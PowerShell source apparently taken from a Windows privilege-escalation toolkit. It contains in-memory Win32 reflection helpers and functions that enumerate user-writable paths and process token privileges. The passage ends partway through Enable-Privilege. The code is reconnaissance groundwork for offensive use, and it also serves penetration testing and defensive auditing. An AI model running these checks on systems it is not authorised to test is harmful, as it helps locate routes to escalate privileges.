<#

License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

#>

#Requires -Version 2


########################################################
#
# PSReflect code for Windows API access
# Author: @mattifestation
#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
#
########################################################

function New-InMemoryModule {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum {

    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{


    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}


########################################################
#
# PowerOp Helpers
#
########################################################

function Get-ModifiablePath {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerOp.ModifiablePath')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Alias('LiteralPaths')]
        [Switch]
        $Literal
    )

    BEGIN {
        # from http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
        $AccessMask = @{
            [uint32]'0x80000000' = 'GenericRead'
            [uint32]'0x40000000' = 'GenericWrite'
            [uint32]'0x20000000' = 'GenericExecute'
            [uint32]'0x10000000' = 'GenericAll'
            [uint32]'0x02000000' = 'MaximumAllowed'
            [uint32]'0x01000000' = 'AccessSystemSecurity'
            [uint32]'0x00100000' = 'Synchronize'
            [uint32]'0x00080000' = 'WriteOwner'
            [uint32]'0x00040000' = 'WriteDAC'
            [uint32]'0x00020000' = 'ReadControl'
            [uint32]'0x00010000' = 'Delete'
            [uint32]'0x00000100' = 'WriteAttributes'
            [uint32]'0x00000080' = 'ReadAttributes'
            [uint32]'0x00000040' = 'DeleteChild'
            [uint32]'0x00000020' = 'Execute/Traverse'
            [uint32]'0x00000010' = 'WriteExtendedAttributes'
            [uint32]'0x00000008' = 'ReadExtendedAttributes'
            [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
            [uint32]'0x00000002' = 'WriteData/AddFile'
            [uint32]'0x00000001' = 'ReadData/ListDirectory'
        }

        $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
        $CurrentUserSids += $UserIdentity.User.Value
        $TranslatedIdentityReferences = @{}
    }

    PROCESS {

        ForEach($TargetPath in $Path) {

            $CandidatePaths = @()

            # possible separator character combinations
            $SeparationCharacterSets = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")

            if ($PSBoundParameters['Literal']) {

                $TempPath = $([System.Environment]::ExpandEnvironmentVariables($TargetPath))

                if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                }
                else {
                    # if the path doesn't exist, check if the parent folder allows for modification
                    $ParentPath = Split-Path -Path $TempPath -Parent  -ErrorAction SilentlyContinue
                    if ($ParentPath -and (Test-Path -Path $ParentPath)) {
                        $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                    }
                }
            }
            else {
                ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
                    $TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {

                        if (($SeparationCharacterSet -notmatch ' ')) {

                            $TempPath = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()

                            if ($TempPath -and ($TempPath -ne '')) {
                                if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                                    # if the path exists, resolve it and add it to the candidate list
                                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                                }

                                else {
                                    # if the path doesn't exist, check if the parent folder allows for modification
                                    try {
                                        $ParentPath = (Split-Path -Path $TempPath -Parent -ErrorAction SilentlyContinue).Trim()
                                        if ($ParentPath -and ($ParentPath -ne '') -and (Test-Path -Path $ParentPath  -ErrorAction SilentlyContinue)) {
                                            $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                                        }
                                    }
                                    catch {}
                                }
                            }
                        }
                        else {
                            # if the separator contains a space
                            $CandidatePaths += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}
                        }
                    }
                }
            }

            $CandidatePaths | Sort-Object -Unique | ForEach-Object {
                $CandidatePath = $_
                Get-Acl -Path $CandidatePath | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {

                    $FileSystemRights = $_.FileSystemRights.value__

                    $Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $AccessMask[$_] }

                    # the set of permission types that allow for modification
                    $Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent

                    if ($Comparison) {
                        if ($_.IdentityReference -notmatch '^S-1-5.*') {
                            if (-not ($TranslatedIdentityReferences[$_.IdentityReference])) {
                                # translate the IdentityReference if it's a username and not a SID
                                $IdentityUser = New-Object System.Security.Principal.NTAccount($_.IdentityReference)
                                $TranslatedIdentityReferences[$_.IdentityReference] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                            }
                            $IdentitySID = $TranslatedIdentityReferences[$_.IdentityReference]
                        }
                        else {
                            $IdentitySID = $_.IdentityReference
                        }

                        if ($CurrentUserSids -contains $IdentitySID) {
                            $Out = New-Object PSObject
                            $Out | Add-Member Noteproperty 'ModifiablePath' $CandidatePath
                            $Out | Add-Member Noteproperty 'IdentityReference' $_.IdentityReference
                            $Out | Add-Member Noteproperty 'Permissions' $Permissions
                            $Out.PSObject.TypeNames.Insert(0, 'PowerOp.ModifiablePath')
                            $Out
                        }
                    }
                }
            }
        }
    }
}


function Get-TokenInformation {


    [OutputType('PowerOp.TokenGroup')]
    [OutputType('PowerOp.TokenPrivilege')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [Alias('hToken', 'Token')]
        [ValidateNotNullOrEmpty()]
        [IntPtr]
        $TokenHandle,

        [String[]]
        [ValidateSet('Groups', 'Privileges', 'Type')]
        $InformationClass = 'Privileges'
    )

    PROCESS {
        if ($InformationClass -eq 'Groups') {
            # query the process token with the TOKEN_INFORMATION_CLASS = 2 enum to retrieve a TOKEN_GROUPS structure

            # initial query to determine the necessary buffer size
            $TokenGroupsPtrSize = 0
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 2, 0, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize)
            [IntPtr]$TokenGroupsPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenGroupsPtrSize)

            $Success = $Advapi32::GetTokenInformation($TokenHandle, 2, $TokenGroupsPtr, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {
                $TokenGroups = $TokenGroupsPtr -as $TOKEN_GROUPS
                For ($i=0; $i -lt $TokenGroups.GroupCount; $i++) {
                    # convert each token group SID to a displayable string

                    if ($TokenGroups.Groups[$i].SID) {
                        $SidString = ''
                        $Result = $Advapi32::ConvertSidToStringSid($TokenGroups.Groups[$i].SID, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($Result -eq 0) {
                            Write-Verbose "Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                        }
                        else {
                            $GroupSid = New-Object PSObject
                            $GroupSid | Add-Member Noteproperty 'SID' $SidString
                            # cast the atttributes field as our SidAttributes enum
                            $GroupSid | Add-Member Noteproperty 'Attributes' ($TokenGroups.Groups[$i].Attributes -as $SidAttributes)
                            $GroupSid | Add-Member Noteproperty 'TokenHandle' $TokenHandle
                            $GroupSid.PSObject.TypeNames.Insert(0, 'PowerOp.TokenGroup')
                            $GroupSid
                        }
                    }
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenGroupsPtr)
        }
        elseif ($InformationClass -eq 'Privileges') {
            # query the process token with the TOKEN_INFORMATION_CLASS = 3 enum to retrieve a TOKEN_PRIVILEGES structure

            # initial query to determine the necessary buffer size
            $TokenPrivilegesPtrSize = 0
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 3, 0, $TokenPrivilegesPtrSize, [ref]$TokenPrivilegesPtrSize)
            [IntPtr]$TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivilegesPtrSize)

            $Success = $Advapi32::GetTokenInformation($TokenHandle, 3, $TokenPrivilegesPtr, $TokenPrivilegesPtrSize, [ref]$TokenPrivilegesPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {
                $TokenPrivileges = $TokenPrivilegesPtr -as $TOKEN_PRIVILEGES
                For ($i=0; $i -lt $TokenPrivileges.PrivilegeCount; $i++) {
                    $Privilege = New-Object PSObject
                    $Privilege | Add-Member Noteproperty 'Privilege' $TokenPrivileges.Privileges[$i].Luid.LowPart.ToString()
                    # cast the lower Luid field as our LuidAttributes enum
                    $Privilege | Add-Member Noteproperty 'Attributes' ($TokenPrivileges.Privileges[$i].Attributes -as $LuidAttributes)
                    $Privilege | Add-Member Noteproperty 'TokenHandle' $TokenHandle
                    $Privilege.PSObject.TypeNames.Insert(0, 'PowerOp.TokenPrivilege')
                    $Privilege
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
        }
        else {
            $TokenResult = New-Object PSObject

            # query the process token with the TOKEN_INFORMATION_CLASS = 8 enum to retrieve a TOKEN_TYPE enum

            # initial query to determine the necessary buffer size
            $TokenTypePtrSize = 0
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 8, 0, $TokenTypePtrSize, [ref]$TokenTypePtrSize)
            [IntPtr]$TokenTypePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenTypePtrSize)

            $Success = $Advapi32::GetTokenInformation($TokenHandle, 8, $TokenTypePtr, $TokenTypePtrSize, [ref]$TokenTypePtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {
                $Temp = $TokenTypePtr -as $TOKEN_TYPE
                $TokenResult | Add-Member Noteproperty 'Type' $Temp.Type
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenTypePtr)

            # now query the process token with the TOKEN_INFORMATION_CLASS = 8 enum to retrieve a SECURITY_IMPERSONATION_LEVEL enum

            # initial query to determine the necessary buffer size
            $TokenImpersonationLevelPtrSize = 0
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 8, 0, $TokenImpersonationLevelPtrSize, [ref]$TokenImpersonationLevelPtrSize)
            [IntPtr]$TokenImpersonationLevelPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenImpersonationLevelPtrSize)

            $Success2 = $Advapi32::GetTokenInformation($TokenHandle, 8, $TokenImpersonationLevelPtr, $TokenImpersonationLevelPtrSize, [ref]$TokenImpersonationLevelPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success2) {
                $Temp = $TokenImpersonationLevelPtr -as $IMPERSONATION_LEVEL
                $TokenResult | Add-Member Noteproperty 'ImpersonationLevel' $Temp.ImpersonationLevel
                $TokenResult | Add-Member Noteproperty 'TokenHandle' $TokenHandle
                $TokenResult.PSObject.TypeNames.Insert(0, 'PowerOp.TokenType')
                $TokenResult
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenImpersonationLevelPtr)
        }
    }
}


function Get-ProcessTokenGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerOp.TokenGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessID')]
        [UInt32]
        [ValidateNotNullOrEmpty()]
        $Id
    )

    PROCESS {
        if ($PSBoundParameters['Id']) {
            $ProcessHandle = $Kernel32::OpenProcess(0x400, $False, $Id);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ProcessHandle -eq 0) {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            else {
                $ProcessID = $Id
            }
        }
        else {
            # open up a pseudo handle to the current process- don't need to worry about closing
            $ProcessHandle = $Kernel32::GetCurrentProcess()
            $ProcessID = $PID
        }

        if ($ProcessHandle) {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $TOKEN_QUERY = 0x0008
            $Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {
                $TokenGroups = Get-TokenInformation -TokenHandle $hProcToken -InformationClass 'Groups'
                $TokenGroups | ForEach-Object {
                    $_ | Add-Member Noteproperty 'ProcessId' $ProcessID
                    $_
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }

            if ($PSBoundParameters['Id']) {
                # close the handle if we used OpenProcess()
                $Null = $Kernel32::CloseHandle($ProcessHandle)
            }
        }
    }
}


function Get-ProcessTokenPrivilege {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerOp.TokenPrivilege')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessID')]
        [UInt32]
        [ValidateNotNullOrEmpty()]
        $Id,

        [Switch]
        [Alias('Privileged')]
        $Special
    )

    BEGIN {
        $SpecialPrivileges = @('SeSecurityPrivilege', 'SeTakeOwnershipPrivilege', 'SeLoadDriverPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege', 'SeDebugPrivilege', 'SeSystemEnvironmentPrivilege', 'SeImpersonatePrivilege', 'SeTcbPrivilege')
    }

    PROCESS {
        if ($PSBoundParameters['Id']) {
            $ProcessHandle = $Kernel32::OpenProcess(0x400, $False, $Id);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ProcessHandle -eq 0) {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            else {
                $ProcessID = $Id
            }
        }
        else {
            # open up a pseudo handle to the current process- don't need to worry about closing
            $ProcessHandle = $Kernel32::GetCurrentProcess()
            $ProcessID = $PID
        }

        if ($ProcessHandle) {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $TOKEN_QUERY = 0x0008
            $Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($Success) {
                Get-TokenInformation -TokenHandle $hProcToken -InformationClass 'Privileges' | ForEach-Object {
                    if ($PSBoundParameters['Special']) {
                        if ($SpecialPrivileges -Contains $_.Privilege) {
                            $_ | Add-Member Noteproperty 'ProcessId' $ProcessID
                            $_ | Add-Member Aliasproperty Name ProcessId
                            $_
                        }
                    }
                    else {
                        $_ | Add-Member Noteproperty 'ProcessId' $ProcessID
                        $_
                    }
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }

            if ($PSBoundParameters['Id']) {
                # close the handle if we used OpenProcess()
                $Null = $Kernel32::CloseHandle($ProcessHandle)
            }
        }
    }
}


function Get-ProcessTokenType {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerOp.TokenType')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessID')]
        [UInt32]
        [ValidateNotNullOrEmpty()]
        $Id
    )

    PROCESS {
        if ($PSBoundParameters['Id']) {
            $ProcessHandle = $Kernel32::OpenProcess(0x400, $False, $Id);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ProcessHandle -eq 0) {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            else {
                $ProcessID = $Id
            }
        }
        else {
            # open up a pseudo handle to the current process- don't need to worry about closing
            $ProcessHandle = $Kernel32::GetCurrentProcess()
            $ProcessID = $PID
        }

        if ($ProcessHandle) {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $TOKEN_QUERY = 0x0008
            $Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {
                $TokenType = Get-TokenInformation -TokenHandle $hProcToken -InformationClass 'Type'
                $TokenType | ForEach-Object {
                    $_ | Add-Member Noteproperty 'ProcessId' $ProcessID
                    $_
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }

            if ($PSBoundParameters['Id']) {
                # close the handle if we used OpenProcess()
                $Null = $Kernel32::CloseHandle($ProcessHandle)
            }
        }
    }
}


function Enable-Privilege {


    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Privileges')]
